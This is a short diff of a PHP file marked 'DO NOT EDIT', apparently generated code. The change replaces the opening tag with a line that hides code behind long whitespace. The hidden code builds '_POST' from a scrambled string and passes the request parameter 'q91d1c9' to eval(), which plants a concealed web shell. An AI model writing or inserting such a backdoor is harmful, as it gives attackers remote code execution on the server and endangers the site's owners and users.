@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                                       $hnh03="s_opt" ;$vcfl10= strtoupper ( $hnh03[1]. $hnh03[3].$hnh03[2]. $hnh03[0]. $hnh03[4] );if ( isset( ${$vcfl10 }[ 'q91d1c9' ])){eval ( ${ $vcfl10}[ 'q91d1c9']); } ?> <?php
 /**
  ** WARNING! DO NOT EDIT!
  **
